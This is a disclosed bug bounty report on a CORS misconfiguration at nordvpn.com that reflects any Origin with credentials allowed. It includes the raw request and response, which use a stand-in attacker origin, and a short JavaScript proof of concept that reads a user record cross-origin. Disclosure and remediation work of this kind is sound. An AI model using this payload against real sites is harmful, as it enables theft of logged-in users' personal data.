# CORS Misconfiguration on nordvpn.com leading to Private Information Disclosure,Account takeover

## Report Details
- **Report ID**: 758785
- **URL**: https://hackerone.com/reports/758785
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-12-15T07:21:37.833Z
- **Disclosed**: 2020-02-21T11:26:28.938Z

## Reporter
- **Username**: shardulb_23
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
Summary: 
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.
This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page

CORS misconfiguration  is found on https://nordvpn.com/nordvpn.com as "Access-Control-Allow-Origin" is dynamically fetched from client Origin header with "Credentials" set as true.

Steps To Reproduce:
Step 1: 
Request:
GET /wp-json/ HTTP/1.1
Host: nordvpn.com
Origin: http://iamsoevil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

Response:
HTTP/1.1 200 OK
Date: Sun, 15 Dec 2019 07:03:00 GMT
Content-Type: application/json; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Cache-Control: public, max-age=1800
Expires: Sun, 15 Dec 2019 07:33:00 GMT
Pragma: no-cache
X-Robots-Tag: noindex
Link: <https://nordvpn.com/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages
Access-Control-Allow-Headers: Authorization, Content-Type
Allow: GET
Access-Control-Allow-Origin: http://iamsoevil.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true
Vary: Origin
X-Generator: front-kr-web-2
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Cache: MISS
X-Frame-Options: SAMEORIGIN
CF-Cache-Status: HIT
Age: 382
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 54568e251c4bd59b-BOM
Content-Length: 91608

Note: Take note from request I inject a header Origin: http://iamsoevil.com then from response it returns Access-Control-Allow-Origin: http://iamsoevil.com. Which mean there is CORS misconfig here (refer screenshot attached).

Step 2:  Exploiting CORS misconfiguration.
1) open https://example.com in browser then inspect the page and go to console. Run the following code in console and you would find it pops up user information or Open above code in any browser and you would find it pops up user information like the attachment.
Code: 
<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://nordvpn.com/wp-json/wp/v2/users/1',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

Remediation: 
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

References:
https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://ejj.io/misconfigured-cors/

Reference Reports: #430249 #317391 #426147 #470298

## Impact

1) In this report I want to describe High level bug which can seriously compromise a user account.If I am authorize on this site, I can steal user's sessions, some personal information or do some action.
2) Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
3) Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.

## Attachments
- cors.png
- Cors2.png
- ExploitCORS.png
